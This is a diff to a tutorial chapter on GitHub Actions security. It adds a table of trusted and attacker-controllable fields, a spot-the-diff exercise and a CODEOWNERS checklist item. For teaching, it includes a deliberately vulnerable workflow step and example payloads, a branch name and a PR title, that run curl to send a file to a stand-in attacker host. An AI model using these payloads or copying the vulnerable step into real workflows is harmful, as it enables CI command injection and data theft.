@@ -1,6 +1,6 @@
 # Chapter 18: Security
 
-**Reading Time:** ~50 minutes
+**Reading Time:** ~55 minutes
 **Prerequisites:** Chapter 09 (The Event Model), Chapter 11 (Tokens & Permissions)
 **Practice Notebook:** `notebooks/practice_18.ipynb`
 **Reference Notebook:** `notebooks/lab_18_security.ipynb`
@@ -169,11 +169,32 @@ untrusted text directly into `run:` at all.
 
 ## 6. Which Fields Are Untrusted
 
-Any context field whose value an outside contributor fully controls counts: PR title and body,
-issue title and body, comment body, branch names (`github.head_ref`), commit messages in some
-contexts. Fields you should generally treat as trusted: `github.repository`, `github.sha` (it's a
-computed hash, not free text), anything from `secrets.*` (a different risk category — Section 12),
-and values *you* set yourself in the workflow file.
+This is the canonical taxonomy for the whole curriculum — Chapter 09 §4 points here for the
+field-by-field split. The rule is simple: any context field whose value an outside contributor
+can set counts as **untrusted** and must never reach a `run:` block directly; fields the platform
+computes or that name permanent repo facts are **generally trusted**. "Generally" is load-bearing —
+GitHub guarantees nothing, so the trusted column means "platform-generated, unlikely to be an
+injection vector," not "safe to `eval`."
+
+| Generally trusted (platform-generated / permanent)   | Attacker-controllable (outside contributor sets the text) |
+| ---------------------------------------------------- | --------------------------------------------------------- |
+| `github.repository` — repo name (permanent)          | `github.event.pull_request.title` · `.body`               |
+| `github.sha` — a computed 40-char hash, not free text | `github.event.issue.title` · `.body`                     |
+| `github.event.pull_request.number` — e.g. `101`      | `github.event.comment.body` · `github.event.review.body`  |
+| `github.run_id` · `github.run_number`                | `github.event.commits.*.message` · `head_commit.message`  |
+| `github.event.pull_request.head.sha` (the hash itself)| `github.head_ref` · `...head.ref` · `...head.label`       |
+| values *you* set yourself in the workflow file       | `...author.email` · `...author.name` · PR labels          |
+
+Two easy traps in the right-hand column. **Branch names** (`github.head_ref`) feel like
+machine-generated identifiers, but a fork author picks their own branch name — `fix/typo` or
+`$(curl attacker.example)` are equally valid Git refs. **Author email and name** feel validated,
+but the local-part of an email address may legally contain `` !#$%&'*+-/=?^_`{|}~ `` — plenty of
+shell metacharacters. Treat both as raw attacker text.
+
+`secrets.*` is a different risk category entirely (Section 12), not part of this trusted/untrusted
+split. And note the two `head` SHAs vs refs: `head.sha` is a computed hash (trusted as *text*, even
+though checking out the *code* it names is the `pull_request_target` footgun of Section 8), while
+`head.ref` and `head.label` are attacker-chosen strings.
 
 ## 7. Building a Detector
 
@@ -261,6 +282,50 @@ being followed consistently from the first workflow written.
 
 ## 15. Practical Tips: A Pre-Merge Security Checklist for New Workflows
 
+### 15.1 — Spot-the-Diff: Two Near-Identical Helper Steps
+
+A fork contributor opens PR #101 (`fix: correct typo in sandbox README`) touching a workflow's
+"comment a summary back on the PR" helper step. The step below is the version already on `main` —
+it reads the PR *number*, and only comments when a prior step failed:
+
+```yaml
+# BEFORE — the step as it lives on main
+- name: Comment PR summary
+  if: always() && failure()
+  env:
+    PR_REF: ${{ github.event.pull_request.number }}
+  run: echo "Reviewing PR #$PR_REF" | tee /tmp/note.txt
+```
+
+Here is the same step as the fork's PR proposes to change it. Three tokens differ. Find them
+before reading on:
+
+```yaml
+# AFTER — the step as the fork PR rewrites it
+- name: Comment PR summary
+  if: always()
+  run: echo "Reviewing ${{ github.event.pull_request.title }}" | tee /tmp/note.txt
+```
+
+**What to notice:**
+
+- **`number` → `title`** — the trusted field (`101`, a computed integer) is swapped for an
+  attacker-controlled one from §6's right-hand column. A PR titled
+  `x"; curl -d @/tmp/note.txt attacker.example #` now injects a shell command exactly as §3 showed.
+- **`env:` indirection deleted** — the value moved from a routed `PR_REF` variable straight into
+  `run:`. That single move is the entire §5 fix, undone. Even the *old* field would now be unsafe
+  if it were attacker-controlled; the new field makes it live.
+- **`if: always() && failure()` → `if: always()`** — the step used to run only on a prior failure
+  (a rare path a reviewer might never exercise); now it fires on **every** run, so the injection
+  triggers on the attacker's very first push. The loosened condition is what turns a latent bug
+  into a reliable exploit.
+
+The lesson: a "harmless" one-line diff to a workflow file can carry a full injection in three tokens
+that a fast scroll-through review will wave past. This is exactly why §15's checklist item on
+CODEOWNERS ownership of `.github/workflows/` exists.
+
+
+
 ```
 Before merging a new/edited workflow file
 ──────────────────────────────────────────────
@@ -269,7 +334,17 @@ Before merging a new/edited workflow file
 [ ] permissions: declared explicitly, scoped to only what this job needs (Chapter 11 §3)
 [ ] Any uses: step from outside actions/* or a trusted publisher? -> review it, consider SHA pinning
 [ ] Any secret ever passed to echo/print/log, even "for debugging"? -> remove it
+[ ] Is .github/workflows/ owned in CODEOWNERS AND require-code-owner-review on in branch protection?
 ```
+
+The last item is the one that specifically protects an **auto-merge** pipeline. A CODEOWNERS entry
+for `.github/workflows/` (the file lives in `.github/`, the repo root, or `docs/`) automatically
+requests a designated reviewer on any PR that touches a workflow — but on its own it only *requests*
+the review; the PR can still merge without it. The mandatory half is branch protection's "Require
+review from Code Owners" toggle. Without that toggle, a §15.1-style three-token workflow diff would
+sail straight through auto-merge with the owner merely pinged — fail-open, the exact inversion of
+this repo's fail-closed philosophy. Owning workflow files *and* requiring the owner's approval is
+what forces every change to your gates through a human door before auto-merge can open.
 
 ## 16. Common Pitfalls & Misconceptions
 
@@ -315,6 +390,8 @@ PR patterns change over time?
 
 - **GitHub Security Lab, "Keeping your GitHub Actions and workflows secure: Untrusted input"** — https://securitylab.github.com/resources/github-actions-untrusted-input/ (fetched 2026-08) — the canonical script-injection writeup
 - **GitHub Docs, "Security hardening for GitHub Actions"** — https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions (fetched 2026-08)
+- **GitHub Docs, "Secure use reference"** — https://docs.github.com/en/actions/reference/security/secure-use (fetched 2026-08) — the current canonical page for the intermediate-`env:`-variable mitigation (the hardening URL above now redirects here); backs §5 but does not itself enumerate the untrusted fields — the field list in §6 comes from the Security Lab writeup above
+- **GitHub Docs, "About code owners"** — https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners (fetched 2026-08) — CODEOWNERS requests review automatically; making it a merge blocker requires branch protection's "Require review from Code Owners" (§15)
 - **GitHub Docs, "Security hardening your deployments"** — https://docs.github.com/en/actions/deployment/security-hardening-your-deployments (fetched 2026-08) — third-party action risk
 - **OpenSSF, "Compiler Options Hardening Guide"** unrelated topic but same publisher's "Scorecards" project is relevant background on supply-chain scoring for actions — https://openssf.org (fetched 2026-08)
 
